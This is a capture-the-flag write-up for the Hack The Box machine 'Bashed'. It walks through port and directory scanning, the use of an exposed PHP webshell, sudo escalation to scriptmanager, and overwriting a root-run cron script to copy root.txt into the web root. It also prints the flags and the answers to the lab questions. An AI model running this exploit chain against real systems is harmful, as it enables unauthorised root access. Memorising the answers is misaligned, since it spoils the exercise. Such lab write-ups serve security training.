# HTB Write-up: Bashed

## Enumeration

### Nmap Scan

```bash
nmap -sV 10.129.242.133
```

- **Port 80/tcp open** → Apache httpd 2.4.18 ((Ubuntu))

**Answer Q1:** 1 open TCP port

<img width="956" height="218" alt="image" src="https://github.com/user-attachments/assets/6799af67-fa4d-4f74-ae99-6ab5d383b791" />

### Gobuster Scan

```bash
gobuster dir -u http://10.129.242.133 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40
```

Found `/dev/` → contained **phpbash.php**

<img width="952" height="804" alt="image" src="https://github.com/user-attachments/assets/16269632-71e0-4d91-9ee1-bc56a01b48f0" />

<img width="995" height="236" alt="image" src="https://github.com/user-attachments/assets/dad5c86d-2665-4489-a2bb-65577a4213b2" />

**Answer Q2:** `/dev/phpbash.php`

## Initial Foothold

Navigating to `http://10.129.242.133/dev/phpbash.php` gave a PHP webshell.

```bash
whoami
```

→ **www-data**

**Answer Q3:** www-data

<img width="891" height="57" alt="image" src="https://github.com/user-attachments/assets/f68a817d-a77b-4db9-bc4b-9ba4448dad9b" />

## User Flag

Check home directories:

```bash
ls /home
# arrexel, scriptmanager
cat /home/arrexel/user.txt
```

Flag:

```
e5146d5f81cdb2c9c1ee024cd92b692e
```

**Answer Q4:** `e5146d5f81cdb2c9c1ee024cd92b692e`

<img width="891" height="57" alt="image" src="https://github.com/user-attachments/assets/cf02827c-b446-443c-abed-4b9ce1091786" />

## Privilege Escalation (to scriptmanager)

Check sudo rights:

```bash
sudo -l
```

<img width="1537" height="104" alt="image" src="https://github.com/user-attachments/assets/17213d8e-1433-4c4b-97b7-e0b979e00c25" />

→ www-data can run anything as **scriptmanager**

**Answer Q5:** scriptmanager

## Privilege Escalation (to root)

Checking `/scripts`:

```bash
sudo -u scriptmanager ls -la /scripts
```

Only **scriptmanager** could write here.

Inside: `test.py` (executed periodically by root).

**Answer Q6:** `/scripts`

**Answer Q7:** test.py

<img width="1536" height="119" alt="image" src="https://github.com/user-attachments/assets/21438bd1-19c7-4456-b149-06d419189a6d" />

### Exploit via Cron

I replaced `test.py` with a Python payload:

```bash
sudo -u scriptmanager bash -c 'echo "import shutil, os; \
shutil.copy(\"/root/root.txt\", \"/var/www/html/dev/root.txt\"); \
os.chmod(\"/var/www/html/dev/root.txt\", 0o644); \
os.chown(\"/var/www/html/dev/root.txt\", 33, 33)" > /scripts/test.py'
```

**Explanation:**

- `shutil.copy` → copies `/root/root.txt` into web directory
- `os.chmod` → makes it world-readable
- `os.chown` → assigns it to www-data (UID 33)

Retrieve with curl:

```bash
curl http://10.129.242.133/dev/root.txt
```

Output:

```
d56e80472d89d7651a421a1aace6b93a
```

**Answer Q8:** `d56e80472d89d7651a421a1aace6b93a`
<img width="1025" height="92" alt="image" src="https://github.com/user-attachments/assets/c4ddec42-98eb-4883-9b26-3c294e78383e" />
